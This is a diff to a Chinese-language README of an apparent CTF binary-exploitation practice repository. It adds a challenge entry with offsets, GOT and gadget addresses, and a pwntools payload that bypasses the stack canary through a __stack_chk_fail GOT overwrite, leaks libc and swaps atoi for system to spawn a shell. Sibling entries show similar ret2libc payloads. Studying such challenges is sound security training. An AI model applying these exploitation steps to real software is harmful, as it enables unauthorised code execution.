@@ -40,6 +40,7 @@
 | `13_putsorsys` | amd64 / 动态 / not stripped | menu + `read(0, buf, 0x100)`，canary | **0x38**（canary 0x28） | `%13$p` leak canary，`%9$s` leak `puts@got` | 保留 canary 后 `system("/bin/sh")` |
 | `18_repeater` | amd64 / 动态 / stripped | 循环 `read(0, buf, 0x100)` + `puts(buf)`，canary | **0x28**（canary 0x28，saved RIP 0x38） | `puts(buf)` 打 canary，再 `puts(read@got)` 回 `main` | `ret` 对齐后 `system("/bin/sh")` |
 | `19_pwnable_silverbullet` | i386 / 动态 / not stripped | `strncat` 把 NUL 写进 `power`，`power` 与 `strlen(desc)` 失配 | 越界 **0x2f**（起点 `ebp-0x3`） | `beat` 判定获胜逼出 `main` 的 `ret`，`puts(read@got)` 回 `main` | `system("/bin/sh")`（整条链无 `\x00`） |
+| `20_bbbaby_pwn1` | amd64 / 动态 / stripped | menu：`read(0, (void*)n, 8)` + `read(0, buf, n)`，canary | **0x110**（canary 0x108） | 改 `__stack_chk_fail@got`=`leave;ret` 绕 canary，CSU `puts(read@got)` 回 `main` | 改 `atoi@got`=`system`，菜单发 `/bin/sh` |
 
 关键地址：
 
@@ -52,6 +53,7 @@
 | `13_putsorsys` | `puts@got=0x404018`、`/bin/sh=0x40205E`、`pop rdi=libc+0x2A3E5`、`ret=libc+0x29CD6` |
 | `18_repeater` | `puts@plt=0x400610`、`read@got=0x601030`、`pop rdi;ret=0x400933`、`ret=0x400934`、`main=0x4007D9` |
 | `19_pwnable_silverbullet` | `read@plt=0x8048490`、`puts@plt=0x80484A8`、`read@got=0x804AFD0`、`main=0x8048954`、`pop3=0x8048A79` |
+| `20_bbbaby_pwn1` | `leave;ret=0x40086A`、`csu_pop=0x4009FA`、`csu_call=0x4009E0`、`__stack_chk_fail@got=0x601020`、`read@got=0x601028`、`atoi@got=0x601040` |
 
 Payload 核心：
 
@@ -86,6 +88,15 @@ b"A" * 0x28 + p64(canary) + p64(0) \
 # 19_pwnable_silverbullet：strncat 补的 NUL 把 power 打坏 -> 越界覆盖返回地址
 b"\xff\xff\xff" + p32(0x01010101) + p32(PUTS_PLT) + p32(MAIN) + p32(READ_GOT)
 b"\xff\xff\xff" + p32(0x01010101) + p32(SYSTEM)   + p32(0x01010101) + p32(BINSH)
+```
+
+```python
+# 20_bbbaby_pwn1：改 __stack_chk_fail@got 绕 canary，再用任意写把 atoi 换成 system
+write8(p, 0x601020, p64(0x40086A))          # __stack_chk_fail -> leave; ret
+overflow(p, csu_call(0x601018, 0x601028))   # puts(read@got) -> main
+menu(p, 2)                                  # main return -> canary 失败 -> 栈迁移
+write8(p, 0x601040, p64(system))            # atoi -> system
+p.sendlineafter(b"your choice", b"/bin/sh")
 ```
 
 ---
@@ -140,6 +151,7 @@ b"\xff\xff\xff" + p32(0x01010101) + p32(SYSTEM)   + p32(0x01010101) + p32(BINSH)
 | `13_putsorsys_speedrun.md` / `13_putsorsys_exp.py` | 格式化字符串 leak canary/puts + canary-safe ROP |
 | `18_repeater_speedrun.md` / `18_repeater_exp.py` | canary leak（`puts(buf)` 型）+ 两阶段 ret2libc，含短读重试 |
 | `19_pwnable_silverbullet_speedrun.md` / `19_pwnable_silverbullet_exp.py` | 逻辑 bug 型栈越界（`strncat` + `power` 失配）+ 两轮 ret2libc |
+| `20_bbbaby_pwn1_speedrun.md` / `20_bbbaby_pwn1_exp.py` | 8 字节任意写 + `__stack_chk_fail@got` 绕 canary + CSU ROP + `atoi@got` 改 `system` |
 | `[NewStarCTF 2023 公开赛道]ret2libc` | 07 的题目二进制 |
 | `jarvisoj_level4` | 10 的题目二进制 |
 | `铁人三项（第五赛区）2018_rop` | 11 的题目二进制 |
@@ -147,6 +159,7 @@ b"\xff\xff\xff" + p32(0x01010101) + p32(SYSTEM)   + p32(0x01010101) + p32(BINSH)
 | `putsorsys` / `libc.so.6` | 13 的题目二进制与附件 libc |
 | `repeater` | 18 的题目二进制（stripped，64 位） |
 | `pwnable_silverbullet` | 19 的题目二进制（not stripped，32 位） |
+| `bbbaby_pwn1` / `libc-2.23.so` | 20 的题目二进制（stripped，64 位）与附件 libc |
 
 > 这些题目都没有单独留 `writeup.md`；对应的 `speedrun.md` 已包含完整逆向、栈布局、gadget 与两阶段利用说明。
 
@@ -197,6 +210,11 @@ python 18_repeater_exp.py
 I386_LD=/tmp/libc32/root/usr/lib32/ld-linux.so.2 \
 I386_LIBPATH=/tmp/libc32/root/usr/lib32 \
 python 19_pwnable_silverbullet_exp.py LOCAL
+
+# 20：任意写 + canary 绕过 + ret2libc
+python 20_bbbaby_pwn1_exp.py LOCAL
+LIBC=./libc-2.23.so HOST=target.example.com PORT=9999 \
+python 20_bbbaby_pwn1_exp.py
 ```
 
 CTF² 等 TLS 平台：
@@ -225,6 +243,12 @@ Canary + read(0, buf, N) + puts(buf) 回显
 ```text
 结构体放栈上 + 长度检查用 power、写入位置用 strlen(desc) + strncat 自动补 NUL
 = 逻辑 bug 型越界：让两个计数失配，越界长度和起点一起变大
+```
+
+```text
+有 canary + 存在任意地址写（或可控长度读）
+= 不要死磕 canary leak：先把 __stack_chk_fail@got 改成 leave;ret / main，
+  让校验失败路径变成栈迁移入口，再用 CSU 链 leak libc
 ```
 
 一句话：**Stage 1 只负责 leak 和回 `main`；Stage 2 才打 `system`。别把 `See you next time` 当 leak。**
